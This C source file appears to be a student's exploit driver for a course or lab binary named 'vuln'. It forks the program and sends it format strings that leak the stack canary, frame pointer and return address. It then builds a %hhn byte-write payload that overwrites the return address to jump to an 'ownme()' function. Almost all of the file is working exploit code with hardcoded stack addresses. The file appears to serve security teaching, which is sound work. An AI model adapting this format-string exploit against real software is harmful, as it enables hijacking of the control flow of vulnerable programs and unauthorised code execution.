#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 100

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   int l=-3;
   for (i=0; i < len; i++) {
  //    if (isprint(buf[i]))
    //     fputc(buf[i], stderr);
     // else fprintf(stderr, "\\x%02hhx", buf[i]);
	if(i%4==0 && i%16==0)
		fprintf(stderr, "\n%4d:", l+=4);
	else if(i%4==0)
		fprintf(stderr, " ");

      fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

char* writeByte(char* at, short val, int takeNth){
   // returns "%[val]d%[takeNth]hhn%[pad]d"
   // invariant: %hhn is 0x00
   char* ret = at;
   short saved_val = val;

   // part 1: %[val]d
   int n = 0;
   val += 0x100;
   int tmp = val;

   *at++ = '%';
   do {
      n++;
      tmp/=10;
   } while(tmp >= 1); // find the length of val

   at+=n; // move the pointer by n 
   while(val >= 1){
       *--at = (val % 10) + '0';
       val /= 10;
   }
   at+=(n); // move to the end of the pointer
   *at++ = 'd';

   // part 2: %hhn
   n = 0;
   tmp = takeNth;
   *at++ = '%';
   do {
      n++;
      tmp/=10;
   } while(tmp >= 1); // find the length of val

   at+=n; // move the pointer by n 
   while(takeNth >= 1){
       *--at = (takeNth % 10) + '0';
       takeNth /= 10;
   }
   at+=(n); // move to the end of the pointer

   *at++ = '$';
   *at++ = 'h';
   *at++ = 'h';
   *at++ = 'n';

   // part 3: %[pad]d
   n = 0;
   int val2 = 0x100 - saved_val + 0x100;
   tmp = val2;
  
   *at++ = '%';
   do {
      n++;
      tmp/=10; 
   } while(tmp >= 1); // find the length of val
 
   at+=n; // move the pointer by n
   while(val2 >= 1){
       *--at = (val2 % 10) + '0'; // write digit startinf from the least significant digit
       fprintf(stderr, "writing at %p: %c\n", at+1, (val2 %10) + '0');
       val2 /= 10;
   }
   at+=n;
   *at++='d';
   *at = '\0';

   fprintf(stderr, "writeByte(%p, 0x%x, %d) = %s\n", ret, val, takeNth, ret);

   return at--;
}

unsigned short digits(int N){
   int ret = 0;
   do{
      ret++;
      N/=10;
   } while(N >= 1);
   return ret;
}



/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   void *auth_user = 0xbfffe6f0;   // value of user variable in auth
   void *auth_canary_loc = 0xbfffe88c; // location where auth's canary is stored
   void *auth_bp_loc = 0xbfffe898; // location of auth's saved bp
   void *auth_ra_loc = 0xbfffe89c; // location of auth's return address

   void *main_loop2_ebp_loc = 0xbfffefa8; // location of main_loop's ebp from run #2
   void *main_loop2_ebp = 0xbfffefd8; // value of main_loop's ebp from run #2
   void *auth_user2 = 0xbfffe700; // value of user variable in auth from run #2
   void *auth_user2_loc = 0xbfffe894; // user variable location from run #2
   void *auth_pass2_loc = 0xbfffe888; // pass variable location from run #2
   void *auth_l2_loc = 0xbfffe898; // l variable location from run #2
   void *auth_ebp2 = 0xbfffe8a8; // value of auth's ebp from run #2


   unsigned int auth_user_auth_ra_loc_diff = auth_ra_loc - auth_user;
   unsigned int auth_user_auth_canary_loc_diff = auth_canary_loc - auth_user;

   unsigned int offset_auth_user2_loc = auth_user2_loc - auth_user2;
   unsigned int offset_auth_pass2_loc = auth_pass2_loc - auth_user2;
   unsigned int offset_auth_l2_loc = auth_l2_loc - auth_user2;

   // this is the offset where the address of jmp to will happen
   unsigned int offset_auth_user_main_loop_bp = main_loop2_ebp - auth_user2;
   fprintf(stderr, "dirver: Expected offset of auth_user from main_loop2 ebp: %d\n", offset_auth_user_main_loop_bp);

   unsigned int offset_auth_ebp = auth_ebp2 - auth_user2;

   unsigned int offset_main_loop_ebp_ebploc = main_loop2_ebp - main_loop2_ebp_loc;

   // exploit idea
   // 1. Extract values
   // 2. Calculate the RA's location
   // 3. Append that into the format string to attack
   //    e.g., e   ADDR%Nd%M$n
   // where N is number of junk bytes to print and M is the M's stack pointer
   // failed: printf cannot output that many 
  
   // 3. e %g...%g[%x maybe]%[pad]d%[val]d%hhn 

   // 1. Extract main_loop()'s address
   put_str("e %431$x %434$x %435$x\n"); // returns the adderss of main_loop()
   send();

   void *main_loop_ra, *main_loop_bp, *canary; // address of main_loop's return address
   get_formatted("%x%x%x", &canary, &main_loop_bp, &main_loop_ra); 
   fprintf(stderr, "driver: Extracted canary: %x temp ebp: %x main_loop_ra: %x\n", canary, main_loop_bp, main_loop_ra);

   // 2. Find address of ownme()
   int offset_main_loop_ra_and_ownme = 1141; // offset from return address to ownme
   void *ownme_addr= (void*)((int)main_loop_ra-offset_main_loop_ra_and_ownme);
   fprintf(stderr, "driver: ownme_addr is %p\n", ownme_addr);

   // 2-1. Find addresss of RA location
   void *ra_loc = main_loop_bp - offset_main_loop_ebp_ebploc + 0x4;
   fprintf(stderr, "driver: ra_loc is %p\n", ra_loc);

   // 3. Prepare the exploit
   
   // 3-1.
   unsigned explsz = 400;

   char *expl = (char**)malloc(explsz);
   memset((void*)expl, 'P', explsz);

   fprintf(stderr, "driver: exploit size: %d\n", explsz);

   expl[0] = 'e';
   expl[1] = ' ';
   expl[2] = ' ';
   expl[3] = ' ';

   // Now initialize the parts of the exploit buffer that really matter. Note
   // that we don't have to worry about endianness as long as the exploit is
   // being assembled on the same architecture/OS as the process being
   // exploited.
   ((void**)expl)[1] = ((char*)ra_loc);
   ((void**)expl)[2] = ((char*)ra_loc) + 1;
   ((void**)expl)[3] = ((char*)ra_loc) + 2;
   ((void**)expl)[4] = ((char*)ra_loc) + 3;
   
   char *c_expl = ((char*) expl) + 4 * 5;
   *c_expl++ = '\0';
   fprintf(stderr, "driver: mid way exploit: %s\n", expl);
   *(--c_expl) = 'P';

   int toWrite = (int)ownme_addr;
   int soFar = 20;

   c_expl += (0x100 - 18);

   for(int i = 0; i < 4; i++){
      short byte = toWrite % 0x100;
      fprintf(stderr, "driver: toWrite=0x%x, byte=0x%x\n", toWrite, byte);
      c_expl = writeByte(c_expl, byte, i+89);
      toWrite /= 0x100;
   }
   
   //int toWrite = (int) ownme_addr;
   //c_expl += d; // shift d # of bytes
   //while(toWrite >= 1){
   //     *--c_expl = (toWrite % 10) + '0';
   //    toWrite /= 10;
   //}
   //c_expl+=(d); // move to the end of the pointer
   //*c_expl++='d';

   // Now, we have 'e   %Nd'

   *c_expl++='\0';
   
   fprintf(stderr, "driver: Prepared exploit: %s\n", expl);

   // 4. Now, send the payload
   put_bin((char*)expl, explsz);
   put_str("\n");
   send();
   getchar();

   put_str("q \n");
   send();

   usleep(100000);
   get_formatted("%*s");

   //kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
